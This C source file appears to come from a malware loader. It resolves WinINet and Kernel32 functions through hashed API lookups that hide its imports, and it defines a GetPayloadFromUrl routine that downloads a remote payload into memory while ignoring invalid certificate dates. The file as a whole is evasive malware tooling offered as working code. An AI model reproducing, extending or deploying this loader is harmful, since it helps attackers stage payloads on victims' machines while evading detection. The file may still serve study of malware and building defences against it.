#include "Common.h"

#define INTERNET_FLAG_HYPERLINK 0x00000400
#define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#define INTERNET_OPTION_SETTINGS_CHANGED 39

extern API_HASHING g_Api;
extern HMODULE hKernel32;

BOOL Init() {

	HMODULE hWininet = GetModuleHandleH(WININETDLL_JOAA);

	// Wininet.dll exported
	g_Api.pInternetOpenW = (fnInternetOpenW)GetProcAddressH(hWininet, InternetOpenW_JOAA);
	g_Api.pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddressH(hWininet, InternetOpenUrlW_JOAA);
	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddressH(hWininet, InternetReadFile_JOAA);
	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(hWininet, InternetCloseHandle_JOAA);
	g_Api.pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddressH(hWininet, InternetSetOptionW_JOAA);

	// Kernel32.dll exported
	g_Api.pLocalAlloc = (fnLocalAlloc)GetProcAddressH(hKernel32, LocalAlloc_JOAA);
	g_Api.pLocalReAlloc = (fnLocalReAlloc)GetProcAddressH(hKernel32, LocalReAlloc_JOAA);
	g_Api.pLocalFree = (fnLocalFree)GetProcAddressH(hKernel32, LocalFree_JOAA);

	return TRUE;
}

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;

	if (!Init()) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	hInternet = g_Api.pInternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = g_Api.pInternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)g_Api.pLocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!g_Api.pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)g_Api.pLocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)g_Api.pLocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		_memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		g_Api.pInternetCloseHandle(hInternet);
	if (hInternetFile)
		g_Api.pInternetCloseHandle(hInternetFile);
	if (hInternet)
		g_Api.pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		g_Api.pLocalFree(pTmpBytes);
	return bSTATE;
}